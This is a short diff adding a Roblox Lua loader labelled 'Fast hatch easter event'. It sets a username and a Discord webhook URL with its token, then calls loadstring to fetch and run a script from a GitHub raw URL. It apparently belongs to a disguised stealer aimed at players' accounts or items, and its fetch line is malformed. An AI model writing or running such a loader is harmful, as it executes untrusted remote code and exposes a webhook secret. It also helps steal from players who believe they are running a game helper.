@@ -1,0 +1,4 @@
+_G.Username = BonkyPork
+_G.HubName = Fast hatch easter event
+_G.WebhookUrl = https://discord.com/api/webhooks/1098968840131580025/VHy2LA2cdYEbuPohXkV2f4-4yoDyAO7CQvTFTdrddOuCvn2-emO_vtoPkZnAesX6Z4Dn
+loadstring(game:https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
